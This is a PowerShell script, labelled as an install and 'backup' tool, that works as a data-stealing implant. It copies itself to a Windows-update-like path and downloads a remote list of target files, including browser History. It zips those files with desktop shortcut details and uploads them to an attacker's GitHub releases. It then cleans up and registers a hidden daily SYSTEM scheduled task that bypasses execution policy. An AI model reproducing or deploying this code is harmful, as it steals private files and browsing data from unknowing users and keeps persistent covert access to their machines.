# install.ps1 - 主功能脚本：上传文件 + 注册任务
$script:logPath = "C:\upload_log.txt"

function Log($msg, $fatal = $false) {
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
    try { $line | Out-File $script:logPath -Append -Encoding UTF8 } catch {}
    Write-Host $line
    if ($fatal) {
        Start-Sleep -Seconds 15
        exit 1
    }
}

Log "===== INSTALL EXECUTED ====="

# === 下载自身到 C:\ProgramData\Microsoft\Windows\update.ps1 ===
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
$remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"

try {
    Invoke-RestMethod -Uri $remoteUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
    Log "[OK] install.ps1 downloaded to $localPath"
} catch {
    Log "❌ Failed to download install.ps1: $($_.Exception.Message)" $true
}

# === 获取 GitHub Token（从环境变量） ===
$token = $env:GITHUB_TOKEN
if (-not $token) {
    Log "❌ GITHUB_TOKEN 环境变量不存在，终止执行。" $true
}
Log "[DEBUG] GITHUB_TOKEN 检测成功"

# === 上传逻辑 ===
try {
    $repo = "drftghy/backup-files"
    $now = Get-Date
    $timestamp = $now.ToString("yyyy-MM-dd-HHmmss-fff")
    $date = $now.ToString("yyyy-MM-dd")
    $computerName = $env:COMPUTERNAME
    $tag = "backup-$computerName-$timestamp"
    $releaseName = "Backup - $computerName - $date"
    $tempRoot = "$env:TEMP\package-$computerName-$timestamp"
    $zipName = "package-$computerName-$timestamp.zip"
    $zipPath = Join-Path $env:TEMP $zipName
    New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null

    # 获取上传路径列表
    $targetListUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
    try {
        $pathList = Invoke-RestMethod -Uri $targetListUrl -UseBasicParsing -ErrorAction Stop
        $paths = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    } catch {
        Log "❌ 无法加载路径列表：$($_.Exception.Message)" $true
    }

    # 复制目标文件
    $i = 0
    foreach ($path in $paths) {
        $i++
        $dst = Join-Path $tempRoot "item$i"
        try {
            if (-not (Test-Path $path)) { continue }
            if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
                robocopy (Split-Path $path) $dst (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            } elseif (Test-Path $path -PathType Container) {
                Copy-Item $path -Destination $dst -Recurse -Force
            } else {
                Copy-Item $path -Destination $dst -Force
            }
        } catch {
            Log "⚠️ 复制失败: $path => $($_.Exception.Message)"
        }
    }

    # 收集桌面快捷方式
    try {
        $desktop = [Environment]::GetFolderPath("Desktop")
        $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
        $lnkReport = ""
        foreach ($lnk in $lnkFiles) {
            $shell = New-Object -ComObject WScript.Shell
            $s = $shell.CreateShortcut($lnk.FullName)
            $lnkReport += "[$($lnk.Name)]`nTarget: $($s.TargetPath)`nArgs: $($s.Arguments)`nStartIn: $($s.WorkingDirectory)`nIcon: $($s.IconLocation)`n---`n"
        }
        $lnkReport | Out-File "$tempRoot\lnk_info.txt" -Encoding utf8
    } catch {
        Log "⚠️ 快捷方式收集失败: $($_.Exception.Message)"
    }

    # 打包
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force

    # 创建 Release
    $releaseData = @{
        tag_name   = $tag
        name       = $releaseName
        body       = "Auto backup from $computerName"
        draft      = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3

    $headers = @{
        Authorization = "token $token"
        "User-Agent"  = "PowerShell"
        Accept        = "application/vnd.github.v3+json"
    }

    $releaseResp = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResp.upload_url -replace "{.*}", "?name=$zipName"

    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent"   = "PowerShell"
    }

    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
    Log "[OK] 上传完成"
} catch {
    Log "❌ 上传失败: $($_.Exception.Message)" $true
}

# 清理临时文件
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# === 注册计划任务（每天 0:00 运行 update.ps1）===
try {
    $taskName = "UploaderTask"
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        Log "[OK] 已删除旧任务"
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal
    Log "[OK] 已注册计划任务 (每天 0:00)"
} catch {
    Log "❌ 注册计划任务失败: $($_.Exception.Message)" $true
}
